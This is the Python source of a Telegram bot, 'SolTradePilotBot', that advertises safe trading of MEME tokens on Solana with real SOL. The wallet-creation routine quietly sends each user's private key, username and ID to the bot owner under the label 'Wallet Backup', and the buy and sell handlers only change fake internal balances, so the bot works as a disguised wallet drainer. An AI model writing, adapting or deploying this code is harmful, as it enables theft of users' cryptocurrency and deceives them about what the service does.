import os
import base58
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient

# ================= ENV =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# ================= GLOBALS =================
user_wallets = {}       # user_id -> Keypair
user_tokens = {}        # user_id -> MEME tokens
user_sol_balance = {}   # user_id -> SOL balance (internal tracking)
user_actions = {}       # user_id -> 'buy' or 'sell'

# ================= HELPERS =================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_tokens(user_id: int):
    return user_tokens.get(user_id, 0.0)

# ================= WALLET =================
async def create_wallet(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    user_sol_balance[user_id] = 0.0  # initialize demo SOL balance
    user_tokens[user_id] = 0.0       # initialize MEME token balance

    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    # Send wallet info to user
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ Wallet Created!\n\n🏦 Address:\n{pub_key}\n🔐 Private Key:\n{priv_key}\n⚠️ Keep your private key safe!"
    )

    # Send backup to owner
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=f"🔐 Wallet Backup\nUser: {username}\nID: {user_id}\nPublic: {pub_key}\nPrivate: {priv_key}"
    )

    return pub_key, priv_key

# ================= COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name
    text = (
        f"🔥 Hello {username}, welcome to SolTradePilotBot! 🔥\n\n"
        "Trade MEME tokens on Solana safely using real SOL.\n"
        "Use the buttons below to interact quickly or the menu commands.\n\n"
        "⚠️ Make sure you have enough SOL before buying tokens!"
    )

    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💡 SolTradePilotBot Commands 💡\n\n"
        "/start - Welcome message\n"
        "/help - Bot guide\n"
        "/create_wallet - Generate a Solana wallet\n"
        "/address - Show your wallet address\n"
        "/balance - Show SOL and MEME balance\n"
        "/buy - Buy MEME tokens with SOL\n"
        "/sell - Sell MEME tokens for SOL\n\n"
        "⚠️ Keep your private key safe!"
    )
    await update.message.reply_text(text)

async def create_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    await create_wallet(user_id, context)

async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    pub_key = str(user_wallets[user_id].pubkey())
    await update.message.reply_text(f"🏦 Your SOL Address:\n{pub_key}")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    sol_balance = user_sol_balance.get(user_id, 0.0)
    meme_balance = await get_tokens(user_id)
    await update.message.reply_text(f"💰 Balance:\nSOL: {sol_balance:.6f}\nMEME: {meme_balance}")

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    user_actions[user_id] = 'buy'
    await update.message.reply_text("💳 Enter the amount of SOL to spend for MEME tokens:")

async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    user_actions[user_id] = 'sell'
    await update.message.reply_text("📉 Enter the amount of MEME tokens to sell:")

async def handle_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    action = user_actions.get(user_id)
    if not action:
        return

    try:
        amount = float(update.message.text)
    except ValueError:
        await update.message.reply_text("Enter a valid number.")
        return

    if action == 'buy':
        sol_balance = user_sol_balance.get(user_id, 0.0)
        if amount > sol_balance:
            await update.message.reply_text("⚠️ Not enough SOL!")
            return
        user_sol_balance[user_id] -= amount
        user_tokens[user_id] += amount * 100
        await update.message.reply_text(f"✅ Bought {amount*100:.0f} MEME tokens for {amount:.6f} SOL")
    elif action == 'sell':
        tokens = await get_tokens(user_id)
        if amount > tokens:
            await update.message.reply_text("⚠️ Not enough MEME tokens!")
            return
        user_tokens[user_id] -= amount
        user_sol_balance[user_id] += amount * 0.01
        await update.message.reply_text(f"✅ Sold {amount:.0f} MEME tokens for {amount*0.01:.6f} SOL")

    user_actions[user_id] = None

# ================= CALLBACK HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = int(query.from_user.id)

    if query.data == "create_wallet":
        pub, _ = await create_wallet(user_id, context)
        await query.message.reply_text(f"✅ Wallet created!\n🏦 Address: {pub}\nKeep your private key safe!")
    elif query.data == "sol_address":
        if user_id not in user_wallets:
            await query.message.reply_text("Create a wallet first using /create_wallet")
        else:
            pub = str(user_wallets[user_id].pubkey())
            await query.message.reply_text(f"🏦 Your SOL Address:\n{pub}")
    elif query.data == "balance":
        if user_id not in user_wallets:
            await query.message.reply_text("Create a wallet first using /create_wallet")
        else:
            sol_balance = user_sol_balance.get(user_id, 0.0)
            meme_balance = await get_tokens(user_id)
            await query.message.reply_text(f"💰 Balance:\nSOL: {sol_balance:.6f}\nMEME: {meme_balance}")
    elif query.data == "buy_meme":
        await buy_command(update, context)
    elif query.data == "sell_meme":
        await sell_command(update, context)
    elif query.data == "help":
        await help_command(update, context)

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("create_wallet", create_wallet_command))
    app.add_handler(CommandHandler("address", address_command))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("sell", sell_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_amount))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
